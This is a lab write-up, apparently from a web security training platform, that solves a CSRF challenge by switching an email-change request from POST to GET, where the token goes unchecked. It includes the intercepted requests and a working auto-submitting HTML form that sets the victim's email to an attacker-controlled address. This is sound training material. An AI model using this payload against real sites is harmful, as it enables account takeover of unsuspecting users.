## Lab 02: CSRF Where Token Validation Depends on Request Method
 
**Technique:** CSRF via GET request method switch
**Target:** Email change functionality
**Status:** Solved
 
### Context
 
The application had CSRF tokens but only validated them on POST requests. The same state-changing endpoint was also reachable via GET with the parameters in the query string, and GET requests were not checked at all.
 
### What I Did
 
Logged in, changed email, intercepted the POST request in Burp:
 
```
POST /my-account/change-email
 
email=test1@gmail.com
csrf=8DZOjIlArc5O2jshH0dhh2U8QToulIkJ
```
 
Sent it to Repeater. First I swapped the CSRF token for a random value and resent it as POST. Server rejected it, confirming the token was being validated on POST.
 
Then I converted the request to GET, moved the parameters to the query string, and kept the fake token:
 
```
GET /my-account/change-email?email=test1@gmail.com&csrf=12345
```
 
Server accepted it. Email changed. The CSRF validation simply did not run on GET requests.
 
From there I built the exploit. Since HTML forms default to GET when no method attribute is specified, the payload was clean:
 
```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victim@attacker.net">
</form>
 
<script>
document.forms[0].submit();
</script>
```
 
Stored it, verified it with View Exploit, delivered to victim. Lab solved.
 
### Why This Works
 
The server checked the CSRF token when the method was POST but had no equivalent check for GET. The developer likely assumed that GET requests cannot cause side effects, which is the intended semantics of GET according to HTTP standards. But they then implemented a state-changing operation that accepted GET anyway, which breaks that assumption. The result is that all the CSRF protection on the POST path is completely irrelevant.
 
---
